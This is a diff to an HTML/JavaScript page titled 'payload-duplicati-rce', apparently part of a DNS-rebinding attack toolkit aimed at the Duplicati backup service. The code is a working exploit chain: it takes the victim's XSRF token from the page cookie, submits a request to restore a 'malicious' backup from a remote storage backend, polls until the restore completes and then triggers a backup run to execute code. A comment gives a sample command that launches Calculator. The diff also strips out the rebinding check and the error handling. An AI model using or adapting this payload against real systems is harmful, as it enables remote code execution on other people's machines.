@@ -23,6 +23,7 @@ Sample script:
 /bin/sh -c '/usr/bin/open -na /Applications/Calculator.app'
 
 -->
+
 <!doctype html>
 <html>
 
@@ -30,8 +31,7 @@ Sample script:
     <title>payload-duplicati-rce</title>
     <script src="payload.js"></script>
     <script>
-
-/*   Insert the location of your backup of a "malicious" shell script below.
+        /*   Insert the location of your backup of a "malicious" shell script below.
 "FTP, SSH, WebDAV as well as popular services like Microsoft OneDrive, 
 Amazon Cloud Drive & S3, Google Drive, box.com, Mega, hubiC and many others 
 (https://www.duplicati.com/)."*/
@@ -67,10 +67,10 @@ Amazon Cloud Drive & S3, Google Drive, box.com, Mega, hubiC and many others
             });
         }
 
-        function attack() {
+        function attack(headers, cookie, body) {
             let tokenResponse;
             let tokenData;
-            let cookie;
+            let myCookie;
             let myHeaders = new Headers();
 
             let formData = new URLSearchParams();
@@ -129,27 +129,18 @@ Amazon Cloud Drive & S3, Google Drive, box.com, Mega, hubiC and many others
                 .then(responseOKOrFail("Could not submit a request to restore a backup"))
                 .then(function (d) { //data
                     tokenData = d;
-                    if (tokenData.includes(indextoken) == false) {
-                        // We can't see token in response. DNS Rebinding must have taken effect
-
-                        /*Restore 'malicious' backup from Google Drive or other backends*/
-                        cookie = document.cookie;
-                        let array = cookie.replace(/%2B/g, "+").replace(/%2F/g, "/")
-                            .split('=');
-                        myHeaders.append("X-XSRF-Token", unescape(array[1]));
-                        myHeaders.append("content-type", "application/json");
-                        return fetch('/api/v1/backups?temporary=true', {
-                            method: 'POST',
-                            credentials: 'include',
-                            headers: myHeaders,
-                            body: JSON.stringify(restoreRequestPayload)
-                        })
-                    } else {
-                        //We saw token in response. DNS Rebinding did not happen.
-                        //Let's wait for the the next time.
-                        throw new Error('hastoken')
-                    }
-
+                    /*Restore 'malicious' backup from Google Drive or other backends*/
+                    myCookie = document.cookie;
+                    let array = myCookie.replace(/%2B/g, "+").replace(/%2F/g, "/")
+                        .split('=');
+                    myHeaders.append("X-XSRF-Token", unescape(array[1]));
+                    myHeaders.append("content-type", "application/json");
+                    return fetch('/api/v1/backups?temporary=true', {
+                        method: 'POST',
+                        credentials: 'include',
+                        headers: myHeaders,
+                        body: JSON.stringify(restoreRequestPayload)
+                    })
                 })
                 .then(responseOKOrFail("Could not submit a request to restore a backup"))
                 .then(function (restoreData) { //data
@@ -166,8 +157,6 @@ Amazon Cloud Drive & S3, Google Drive, box.com, Mega, hubiC and many others
                 })
                 .then(responseOKOrFail("Could not restore backup"))
                 .then(function (d) { //data
-                    //Attack once
-                    clearInterval(timer);
 
                     /*Poll service to determine if 'malicious ' backup was restored*/
                     return restoreIsCompleted(JSON.parse(d).TaskID, myHeaders)
@@ -199,38 +188,17 @@ Amazon Cloud Drive & S3, Google Drive, box.com, Mega, hubiC and many others
                 })
                 .then(responseOKOrFail("Could not run configured backup"))
                 .then(function (d) { // data
-                        attackSuccess(d);
+                    console.log(`success: ${d}`);
                 })
-                .catch(function (error) {
-                    if (error instanceof TypeError) { // We cannot establish an HTTP connection
-                        console.log("frame " + window.location.hostname + " could not load");
-                        window.parent.postMessage({
-                            status: "error",
-                        }, "*");
-                    } else if (error.message == 'hastoken') {
-                        console.log('DNS rebinding did not happen yet')
-                    } else if (error.message == '404') { // We received a 404
-                        console.log("file not found. Frame " + window.location.hostname +
-                            " has not updated dns yet, waiting " + interval +
-                            " ms")
-                    } else { // We did not handle something
-                        console.log('Unhandled error: ' + error);
-                        window.parent.postMessage({
-                            status: "error",
-                        }, "*");
-                    }
-                })
+                .catch(e => console.log(e));
+                    
         }
     </script>
 </head>
 
-<body onload="begin()">
-    <p>
-        <h3>DNS Rebinding Vulnerability Duplicati RCE</h3>
-    </p>
-    <p>
-        This page is waiting for a dns update.
-    </p>
+<body onload="begin('/')" )>
+    <h3>Duplicati RCE Payload</h3>
+    <p><span id='hostname'></span>. <span id='rebindingstatus'>This page is waiting for a DNS update.</span></p>
 </body>
 
 </html>
